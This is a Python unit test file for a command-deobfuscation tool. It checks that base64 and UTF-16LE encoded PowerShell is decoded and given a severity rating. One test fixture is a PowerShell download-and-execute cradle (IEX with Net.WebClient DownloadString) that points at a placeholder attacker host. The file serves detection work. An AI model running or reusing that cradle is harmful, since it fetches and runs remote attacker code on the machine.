import base64
import unittest

from cmd_unmask.models import Severity
from cmd_unmask.unpacker import unmask_command


class TestRawBase64AndUtf16leNormalization(unittest.TestCase):
    def test_standalone_raw_utf16le_base64_decodes_without_enc_wrapper(self):
        script = "Write-Output 'Audit OK'\nGet-Service -Name Spooler"
        b64 = base64.b64encode(script.encode("utf-16le")).decode("ascii")

        verdict = unmask_command(b64)
        self.assertNotIn("\x00", verdict.primary_unmasked_payload)
        self.assertIn("Write-Output 'Audit OK'", verdict.primary_unmasked_payload)
        self.assertIn("Get-Service -Name Spooler", verdict.primary_unmasked_payload)

    def test_multiline_wrapped_raw_utf16le_base64_decodes_cleanly(self):
        script = "IEX (New-Object Net.WebClient).DownloadString('http://cdn.evil.example/stage.ps1')"
        b64 = base64.b64encode(script.encode("utf-16le")).decode("ascii")
        wrapped = "\n".join(b64[i : i + 40] for i in range(0, len(b64), 40))

        verdict = unmask_command(wrapped)
        self.assertNotIn("\x00", verdict.primary_unmasked_payload)
        self.assertIn("DownloadString('http://cdn.evil.example/stage.ps1')", verdict.primary_unmasked_payload)
        self.assertGreaterEqual(verdict.severity.rank, Severity.HIGH.rank)

    def test_benign_non_base64_counter_examples_do_not_decode(self):
        benign_inputs = [
            "The quick brown fox jumps over the lazy dog in production",
            "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "AdministratorSessionToken2026Production",
            base64.b64encode(bytes(range(1, 32))).decode("ascii"),  # non-printable binary gibberish
        ]
        for raw in benign_inputs:
            verdict = unmask_command(raw)
            self.assertEqual(
                verdict.provenance_chain,
                [],
                f"Falsely decoded benign counter-example: {raw!r}",
            )


if __name__ == "__main__":
    unittest.main()
